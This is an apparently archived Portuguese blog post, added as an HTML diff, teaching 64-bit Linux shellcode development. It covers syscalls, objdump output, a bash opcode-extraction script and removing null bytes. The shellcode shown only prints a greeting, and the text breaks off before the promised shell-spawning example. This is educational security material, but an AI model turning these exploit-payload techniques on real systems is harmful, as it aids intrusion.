@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Shellcode 64 ASM Language Developing</title>
+	
+	<meta name="author" content="mh4x0f">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	One 0x41414141 worth a thousand words
+</div>
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
+			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
+			<input type="hidden" value="chmodsecurity" name="uri" >
+		  <input type="hidden" name="loc" value="pt_BR">
+		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
+		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
+	      </div>
+		</form>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Shellcode 64 ASM Language Developing </h1>
+</div>
+	
+<article>
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   November 
+	   13th,
+	   
+	   2014
+	 </span>
+	  <div class="article_body">
+	  <p>Desenvolver shellcode não é uma tarefa complicada, dependendo do OS, ou arquitetura  pode-se criar com muita facilidade,(esse artigo é direcionando para quem já brincou no desenvolvimento de shellcode :D) lógico conhecendo bem assimbly, já windows a tarefa fica um pouco mais complexa, como no linux trabalhamos com systemcall, no windows usamos as famosas API's, que serve de base na criação dos shellcode, também é possível desenvolver shellcode's para windows usando um script &lt;a href="http://www.vividmachines.com/shellcode/arwin.c" target=_blank&gt;Arwin.c, o que ele faz é simplesmente pegar o endereço da DLL,( API) que vai ser passada como parâmetro. o funcionamento dele é bem parecido a syscall em vez de procurar lá no diretório <a> cat /usr/include/asm/unistd_32.h</a>, primeiro precisamos decidir quais as funções que deseja usar para este shellcode e, em seguida, encontrar os seus endereços absolutos.</p>
+<pre class="code">
+C: \&gt; Arwin sleep kernel32.dll
+arwin - win32 address resolution program - by steve hanna - v.01
+Sleep is located at 0x47e66bba in kernel32.dll
+                                     ^
+                                     |
+                                     | ----- Endereço da função Sleep  threading :D 
+=================================================
+# Argumento da thread quantidade de milisegundos
+public:
+static void Sleep(
+	int millisecondsTimeout
+)
+=================================================
+</pre>
+<p> Essa Sleep, é a famosa threading, bem conhecida por programadores, depois é só usar assembly e passar os devidos parâmetros da função, em fim, deixa isso para um próximo artigo. Nesse artigo veremos como escrever  um shellcode que executa um <a>"bin/sh"</a> e fazendo um shellcode  shutdown pra tollar geral rsrsrs, quem sabe um backconnect futuramente , em linux 64 bit's, se você já criou um sabe muito bem que há diferença em x86 e 64 bits, até porque os nomes dos registradores vão mudar lembra, antes quando era 16 bit, era AX, quando surgiu x86, 32 bit mudaram para extendido, <a>EAX</a>, também vai mudar a chamada do kernel, ou interrupção, em 32 bit era <a>int $0x80</a> já no 64 fica até mais fácil apenas <a>syscall</a>, vou deixar um link: http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64 , e como já falei dos registradores vai ai todos eles:</p>
+<pre class="code">
+===========================
+EBX, ECX, EDX, ESI, EDI, EBP     | x86 bits 
+===========================
+RAX, RDI, RSI, RDX, R10, R8, R9        | x64 Bits
+===========================
+</pre>
+<p> É basicamente isso,agora é so procurar um syscall e trabalhar usando a mesma, para refrescar a mente vamos para um exemplo prático, nada de sleep(),. como eu falei não existe muita diferença, uma dele é a mudança dos registradores e a outra é o número equivalente da syscall que irá ser chamada, exemplos: </p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="err">//======================32</span> <span class="nf">bit</span> <span class="err">========================</span>
+<span class="na">.global</span> <span class="no">_start</span>
+ <span class="na">.text</span>
+<span class="nl">_start:</span>
+        <span class="c"># chamada das syscall </span>
+        <span class="nf">mov</span>     <span class="no">$4</span><span class="p">,</span> <span class="nv">%eax</span>                <span class="c"># system call número 4 tabela:  cat /usr/include/asm/unistd_32.h  </span>
+        <span class="nf">mov</span>     <span class="no">$1</span><span class="p">,</span> <span class="nv">%ebx</span>                <span class="c"># file handle de saiada </span>
+        <span class="nf">mov</span>     <span class="no">$messagem</span><span class="p">,</span> <span class="nv">%ecx</span>          <span class="c"># endereço da DB message</span>
+        <span class="nf">mov</span>     <span class="no">$21</span><span class="p">,</span> <span class="nv">%edx</span>               <span class="c"># número de bytes sizeof(messagem)</span>
+        <span class="nf">int</span>     <span class="no">$0x80</span>                   <span class="c"># chama kernel interrupção </span>
+        
+        <span class="c"># exit(0) </span>
+        <span class="nf">mov</span>     <span class="no">$1</span><span class="p">,</span> <span class="nv">%eax</span>                <span class="c"># system call 1 é a exit</span>
+        <span class="nf">xor</span>     <span class="nv">%ebx</span><span class="p">,</span> <span class="nv">%ebx</span>              <span class="c"># argumento de retorno</span>
+        <span class="nf">int</span>     <span class="no">$0x80</span>                   <span class="c"># chama a syscall :D </span>
+<span class="nl">messagem:</span>
+        <span class="na">.ascii</span>  <span class="s">&quot;Hello, World da vida \n&quot;</span> <span class="c"># nossa string</span></code></pre></div>
+
+<p>É né deu pra lembrar dos velhos tempos, uma diga que dou pra você tente desenvolver o máximo possível de syscall, programinhas em assembly que use elas para praticar, e desenvolver um conhecimento básico do mesmo. é preciso treinar meu amigo. Eu programei este artigo para escrever em assembly com C, mas tou vendo melhor deixar tudo em asm mesmo vai. vamos ver agora como fica em 64 bit's o mesmo código.
+</p>
+<pre>
+//====================64 bits =======================
+.global _start
+.text
+_start:
+        # 
+        mov     $1, %rax                # system call 1 é a de escrita em 64
+        mov     $1, %rdi                # file handle de saida
+        mov     $messagem, %rsi          # endereço da DB messagem
+        mov     $21, %rdx               # números de bytes 
+        syscall                         # kernel interrupção :D chama syscall
+
+        # exit(0) vamos lá 
+        mov     $60, %rax               # system call 60 corresponde a exit(0)
+        xor     %rdi, %rdi              # zerando rdi, argumento de retorno :D 
+        syscall                         # chama syscall novamente :D 
+messagem:
+        .ascii  "Hello, World da vida\n"
+</pre>
+<p>Vamos compilar pra ver como fica, fazendo um  debugger com objdump:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">c</span> <span class="n">msg</span><span class="p">.</span><span class="n">s</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ld</span> <span class="n">msg</span><span class="p">.</span><span class="n">o</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+<span class="n">Hello</span><span class="p">,</span> <span class="n">World</span> <span class="n">da</span> <span class="n">vida</span> <span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+
+<span class="n">a</span><span class="p">.</span><span class="nl">out</span><span class="p">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf64</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span>
+
+
+<span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
+
+<span class="mo">000000000040007</span><span class="mi">8</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>
+  <span class="mi">400078</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c0</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mf">40007f</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">400086</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c6</span> <span class="n">a2</span> <span class="mo">00</span> <span class="mi">40</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x4000a2</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span>
+  <span class="mi">40008</span><span class="nl">d</span><span class="p">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c2</span> <span class="mi">15</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x15</span><span class="p">,</span><span class="o">%</span><span class="n">rdx</span>
+  <span class="mi">400094</span><span class="o">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+  <span class="mi">400096</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c0</span> <span class="mi">3</span><span class="n">c</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x3c</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">40009</span><span class="nl">d</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">ff</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">4000</span><span class="nl">a0</span><span class="p">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+
+<span class="mo">00000000004000</span><span class="n">a2</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">&gt;:</span>
+  <span class="mi">4000</span><span class="nl">a2</span><span class="p">:</span>	<span class="mi">48</span>                   	<span class="n">rex</span><span class="p">.</span><span class="n">W</span>
+  <span class="mi">4000</span><span class="nl">a3</span><span class="p">:</span>	<span class="mi">65</span>                   	<span class="n">gs</span>
+  <span class="mi">4000</span><span class="nl">a4</span><span class="p">:</span>	<span class="mi">6</span><span class="n">c</span>                   	<span class="n">insb</span>   <span class="p">(</span><span class="o">%</span><span class="n">dx</span><span class="p">),</span><span class="o">%</span><span class="nl">es</span><span class="p">:(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">a5</span><span class="p">:</span>	<span class="mi">6</span><span class="n">c</span>                   	<span class="n">insb</span>   <span class="p">(</span><span class="o">%</span><span class="n">dx</span><span class="p">),</span><span class="o">%</span><span class="nl">es</span><span class="p">:(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">a6</span><span class="p">:</span>	<span class="mf">6f</span>                   	<span class="n">outsl</span>  <span class="o">%</span><span class="nl">ds</span><span class="p">:(</span><span class="o">%</span><span class="n">rsi</span><span class="p">),(</span><span class="o">%</span><span class="n">dx</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">a7</span><span class="p">:</span>	<span class="mi">2</span><span class="n">c</span> <span class="mi">20</span>                	<span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
+  <span class="mi">4000</span><span class="nl">a9</span><span class="p">:</span>	<span class="mi">57</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">4000</span><span class="nl">aa</span><span class="p">:</span>	<span class="mf">6f</span>                   	<span class="n">outsl</span>  <span class="o">%</span><span class="nl">ds</span><span class="p">:(</span><span class="o">%</span><span class="n">rsi</span><span class="p">),(</span><span class="o">%</span><span class="n">dx</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">ab</span><span class="p">:</span>	<span class="mi">72</span> <span class="mi">6</span><span class="n">c</span>                	<span class="n">jb</span>     <span class="mi">400119</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">+</span><span class="mh">0x77</span><span class="o">&gt;</span>
+  <span class="mi">4000</span><span class="nl">ad</span><span class="p">:</span>	<span class="mi">64</span> <span class="mi">20</span> <span class="mi">64</span> <span class="mi">61</span> <span class="mi">20</span>       	<span class="n">and</span>    <span class="o">%</span><span class="n">ah</span><span class="p">,</span><span class="o">%</span><span class="nl">fs</span><span class="p">:</span><span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="n">rcx</span><span class="p">,</span><span class="o">%</span><span class="n">riz</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+  <span class="mi">4000</span><span class="nl">b2</span><span class="p">:</span>	<span class="mi">76</span> <span class="mi">69</span>                	<span class="n">jbe</span>    <span class="mi">40011</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">+</span><span class="mh">0x7b</span><span class="o">&gt;</span>
+  <span class="mi">4000</span><span class="nl">b4</span><span class="p">:</span>	<span class="mi">64</span>                   	<span class="n">fs</span>
+  <span class="mi">4000</span><span class="nl">b5</span><span class="p">:</span>	<span class="mi">61</span>                   	<span class="p">(</span><span class="n">bad</span><span class="p">)</span>  
+  <span class="mi">4000</span><span class="nl">b6</span><span class="p">:</span>	<span class="mi">20</span> <span class="mi">0</span><span class="n">a</span>                	<span class="n">and</span>    <span class="o">%</span><span class="n">cl</span><span class="p">,(</span><span class="o">%</span><span class="n">rdx</span><span class="p">)</span>
+
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">ls</span>
+<span class="n">msg</span><span class="p">.</span><span class="n">o</span>  <span class="n">msg</span><span class="p">.</span><span class="n">s</span>  <span class="n">shell</span>  <span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span>  <span class="n">shell</span><span class="p">.</span><span class="n">s</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span> <span class="n">shell</span>
+<span class="s">&quot;</span><span class="se">\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\xa2\x00\x40\x00\x48\xc7\xc2\x15</span><span class="s">\</span>
+<span class="s">x00</span><span class="se">\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72</span><span class="s">\</span>
+<span class="s">x6c</span><span class="se">\x64\x20\x64\x61\x20\x76\x69\x64\x61\x20\x0a</span><span class="s">&quot;</span>
+<span class="nl">len</span><span class="p">:</span>  <span class="mi">64</span>
+
+<span class="n">Shellcode</span> <span class="n">de</span> <span class="n">tamanho</span> <span class="mi">64</span> <span class="nl">bytes</span><span class="p">:</span>
+<span class="s">&quot;</span><span class="se">\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\xa2\x00\x40\x00\x48\xc7\xc2\x15\x00</span><span class="s">\</span>
+<span class="s">x00</span><span class="se">\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64</span><span class="s">\</span>
+<span class="s">x20</span><span class="se">\x64\x61\x20\x76\x69\x64\x61\x20\x0a</span><span class="s">&quot;</span></code></pre></div>
+
+<p>Claro, isso como shellcode seria uma coisa feia, cheio de <a>bad char</a>  que não é bem vindo no shellcode, claro que 0x00, não existe apenas esse caracter que pode complicar a execução do mesmo, bytes nulos são comum existe muito método para evitado um dele você deve conhecer zerar os registradores e outra levar paa paste baixa do registrador,  alguns outros bytes como <a>linefeed(?\n?, ou ?\x0A?)</a>,  carriage return(?\x0D?), etc. podem  nos causar problemas, como quebrar o shellcode em dois ou mais (linefeed), como se entrássemos  com 2 linhas separadas de shellcode. há para extrair o shellcode do arquivo é sempre bom contar com shell script para gerar sem precisar ficar catando linha por linha, é sempre bom usar a programação para automatizar esses processo :D shellcode.sh</p>
+<pre class="code">
+#!/bin/bash
+code=$(objdump -d $1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|tr -s ' '|tr '\t' '!'|cut -d \! -f 2|sed s/^/\ /g|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
+len=$(echo $code|grep -o \\\\|wc -l)
+echo $code
+echo "len: " $len
+</pre>
+<p>Um simples exemplo com mesmo código para gerar semi-bytes nulos com métodos básico para eliminar os bad char.</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">cat</span> <span class="n">msg</span><span class="p">.</span><span class="n">s</span>
+<span class="p">.</span><span class="n">global</span> <span class="n">_start</span>
+<span class="p">.</span><span class="n">text</span>
+<span class="nl">_start</span><span class="p">:</span>
+        <span class="cp"># </span>
+	<span class="n">xor</span> 	<span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>                <span class="err">#</span> <span class="n">zera</span> <span class="n">o</span> <span class="n">registrador</span> <span class="n">evitar</span> <span class="n">bad</span> <span class="kt">char</span>
+        <span class="n">movb</span>     <span class="err">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="n">al</span>                <span class="err">#</span> <span class="n">move</span> <span class="mi">1</span> <span class="n">para</span> <span class="n">parte</span> <span class="n">baixa</span> <span class="k">do</span> <span class="n">registrador</span> 
+        <span class="n">movb</span>     <span class="err">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="n">dl</span>                <span class="err">#</span> <span class="n">file</span> <span class="n">handle</span> <span class="n">de</span> <span class="n">saida</span> <span class="n">para</span> <span class="n">pate</span> <span class="n">baixa</span> 
+        <span class="n">mov</span>     <span class="err">$</span><span class="n">messagem</span><span class="p">,</span> <span class="o">%</span><span class="n">rsi</span>          <span class="err">#</span> <span class="n">endere</span><span class="err">ç</span><span class="n">o</span> <span class="n">da</span> <span class="n">DB</span> <span class="n">messagem</span> <span class="c1">// aqui onde tá o mal bad char endereço da msg :( </span>
+        <span class="n">movb</span>     <span class="err">$</span><span class="mi">21</span><span class="p">,</span> <span class="o">%</span><span class="n">dl</span>               <span class="err">#</span> <span class="n">n</span><span class="err">ú</span><span class="n">meros</span> <span class="n">de</span> <span class="n">bytes</span> 
+        <span class="n">syscall</span>                         <span class="err">#</span> <span class="n">kernel</span> <span class="n">interrup</span><span class="err">çã</span><span class="nl">o</span> <span class="p">:</span><span class="n">D</span> <span class="n">chama</span> <span class="n">syscall</span>
+
+        <span class="cp"># exit(0) vamos lá </span>
+        <span class="n">movb</span>     <span class="err">$</span><span class="mi">60</span><span class="p">,</span> <span class="o">%</span><span class="n">al</span>               <span class="err">#</span> <span class="n">system</span> <span class="n">call</span> <span class="mi">60</span> <span class="n">corresponde</span> <span class="n">a</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">xor</span>     <span class="o">%</span><span class="n">rdi</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>              <span class="err">#</span> <span class="n">zerando</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">argumento</span> <span class="n">de</span> <span class="nl">retorno</span> <span class="p">:</span><span class="n">D</span> 
+        <span class="n">syscall</span>                         <span class="err">#</span> <span class="n">chama</span> <span class="n">syscall</span> <span class="nl">novamente</span> <span class="p">:</span><span class="n">D</span> 
+<span class="nl">messagem</span><span class="p">:</span>
+        <span class="p">.</span><span class="n">ascii</span>  <span class="s">&quot;Hello, World da vida</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">c</span> <span class="n">msg</span><span class="p">.</span><span class="n">s</span> <span class="o">&amp;&amp;</span> <span class="n">ld</span> <span class="n">msg</span><span class="p">.</span><span class="n">o</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+<span class="n">Hello</span><span class="p">,</span> <span class="n">World</span> <span class="n">da</span> <span class="n">vida</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span> 
+
+<span class="n">a</span><span class="p">.</span><span class="nl">out</span><span class="p">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf64</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span>
+
+
+<span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
+
+<span class="mo">000000000040007</span><span class="mi">8</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>
+  <span class="mi">400078</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">c0</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">40007</span><span class="nl">b</span><span class="p">:</span>	<span class="n">b0</span> <span class="mo">01</span>                	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
+  <span class="mi">40007</span><span class="nl">d</span><span class="p">:</span>	<span class="n">b2</span> <span class="mo">01</span>                	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">dl</span>
+  <span class="mf">40007f</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="n">c6</span> <span class="mi">91</span> <span class="mo">00</span> <span class="mi">40</span> <span class="mo">00</span> 	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x400091</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span>
+  <span class="mi">400086</span><span class="o">:</span>	<span class="n">b2</span> <span class="mi">15</span>                	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x15</span><span class="p">,</span><span class="o">%</span><span class="n">dl</span>
+  <span class="mi">400088</span><span class="o">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+  <span class="mi">40008</span><span class="nl">a</span><span class="p">:</span>	<span class="n">b0</span> <span class="mi">3</span><span class="n">c</span>                	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x3c</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
+  <span class="mi">40008</span><span class="nl">c</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">ff</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
+  <span class="mf">40008f</span><span class="o">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+
+<span class="mo">00000000004000</span><span class="mi">91</span> <span class="o">&lt;</span><span class="n">messagem</span><span class="o">&gt;:</span>
+  <span class="mi">400091</span><span class="o">:</span>	<span class="mi">48</span>                   	<span class="n">rex</span><span class="p">.</span><span class="n">W</span>
+  <span class="mi">400092</span><span class="o">:</span>	<span class="mi">65</span>                   	<span class="n">gs</span>
+  <span class="mi">400093</span><span class="o">:</span>	<span class="mi">6</span><span class="n">c</span>                   	<span class="n">insb</span>   <span class="p">(</span><span class="o">%</span><span class="n">dx</span><span class="p">),</span><span class="o">%</span><span class="nl">es</span><span class="p">:(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
